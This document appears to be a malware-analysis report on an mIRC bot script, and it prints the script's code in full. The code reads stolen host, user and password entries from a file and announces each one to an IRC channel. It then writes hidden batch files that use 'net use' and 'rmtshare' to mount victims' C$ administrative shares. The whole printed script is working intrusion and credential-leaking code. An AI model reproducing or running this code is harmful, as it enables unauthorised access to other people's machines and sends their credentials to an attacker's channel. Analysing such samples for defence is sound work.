behavior.run: May run an executable file or a system command

docinfo.macro:
[script]
n0=alias getroot { if ($lines(%store.file) < 3) { halt }
n1=  set %t.host \\ $+ $read(%store.file,1)
n2=  write -dl1 %store.file  
n3=  set %t.user $read(%store.file,1)
n4=  write -dl1 %store.file  
n5=  set %t.pass $read(%store.file,1) 
n6=  write -dl1 %store.file   
n7=  if (%t.pass == "[NULL]") { null | halt }
n8=  else { root | halt }  
n9=}
n10=alias root {
n11=  :select  
n12=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat
n13=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  
n14=  set %t.drive $rand(l,z) $+ :
n15=  if ($exists(%t.drive) == $true) { goto select }
n16=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: %t.pass %cclogo
n17=  write %checkfile net use %t.host /USER: $+ %t.user %t.pass
n18=  write %checkfile rmtshare.exe %t.host $+ \C$=C:\
n19=  write %checkfile net use %t.drive %t.host $+ \C$
n20=  run hiddenrun.exe %checkfile
n21=  timercheck 1 60 checker
n22=}
n23=alias null {
n24=  :select  
n25=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat
n26=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  
n27=  set %t.drive $rand(l,z) $+ :
n28=  if ($exists(%t.drive) == $true) { goto select }
n29=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: Blank Password %cclogo
n30=  write %checkfile net use %t.host /USER: $+ %t.user ""
n31=  write %checkfile rmtshare.exe %t.host $+ \C$=C:\
n32=  write %checkfile net use %t.drive %t.host $+ \C$
n33=  run hiddenrun.exe %checkfile
n34=  timercheck 1 60 checker
n35=}

filetype: ASCII text, with CRLF line terminators

dump: n16=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: %t.pass %cclogo
n29=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: Blank Password %cclogo
